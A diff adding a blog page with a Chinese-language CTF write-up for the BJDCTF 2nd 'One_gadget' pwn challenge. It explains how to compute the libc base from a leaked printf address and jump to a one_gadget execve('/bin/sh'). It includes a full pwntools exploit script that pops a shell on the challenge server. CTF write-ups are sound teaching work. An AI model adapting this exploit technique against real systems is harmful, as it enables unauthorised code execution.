@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BJDCTF 2nd Pwn One_gadget | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BJDCTF 2nd Pwn One_gadget</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/03/23</h2>
+</div>
+
+<main>
+<h1 id="bjdctf-2nd-pwn-one_gadget">BJDCTF 2nd Pwn One_gadget</h1>
+<p>考点：</p>
+<p>1、one_gadget小工具的使用</p>
+<p>2、libc基地址的计算，利用基地址得出其他libc函数的地址</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323224603541.png" alt="image-20200323224603541"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323224754035.png" alt="image-20200323224754035"></p>
+<p>从main函数来看v4是个函数指针，传入一个函数地址就能执行，但是这里的v4是用%ld接收的所以传入的地址要是10进制的数字串，%ld表示数据按十进制有符号长型整数输入或输出</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323224820771.png" alt="image-20200323224820771"></p>
+<p>有个init，直接打印出printf函数的真实地址，这样就可以通过这个地址减去libc中printf的偏移得到基地址，从而用基地址+one_gadget在libc中的偏移得出execve(&quot;/bin/sh&quot;)的地址，在传给程序就能getshell</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323231722663.png" alt="image-20200323231722663"></p>
+<p>选择0x106ef8这个one_gadget</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+
+<span style="color:#75715e">#sh = process(&#39;./one_gadget&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">26004</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ubuntu19-x64-libc-2.29.so</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e">#sh.recvuntil(&#39;u:&#39;)</span>
+printf_addr <span style="color:#f92672">=</span> int(sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">15</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
+<span style="color:#75715e">#int(s,16)这个函数将字符串转成16进制数</span>
+base_addr <span style="color:#f92672">=</span> printf_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">printf</span><span style="color:#e6db74">&#39;</span>]<span style="color:#75715e">#计算基地址</span>
+one_gadget <span style="color:#f92672">=</span> base_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x106ef8</span><span style="color:#75715e">#计算one_gadget的地址</span>
+
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">printf_addr: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(printf_addr))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc_printf_offset: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">printf</span><span style="color:#e6db74">&#39;</span>]))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc_base_addr: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(base_addr))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">one_gadget_addr: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>  hex(one_gadget))
+
+payload <span style="color:#f92672">=</span> str(one_gadget) <span style="color:#75715e">#因为是作为字符串传入的所以用str</span>
+<span style="color:#66d9ef">print</span> payload
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">one gadget:</span><span style="color:#e6db74">&#39;</span>,payload)
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200323231540907.png" alt="image-20200323231540907"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
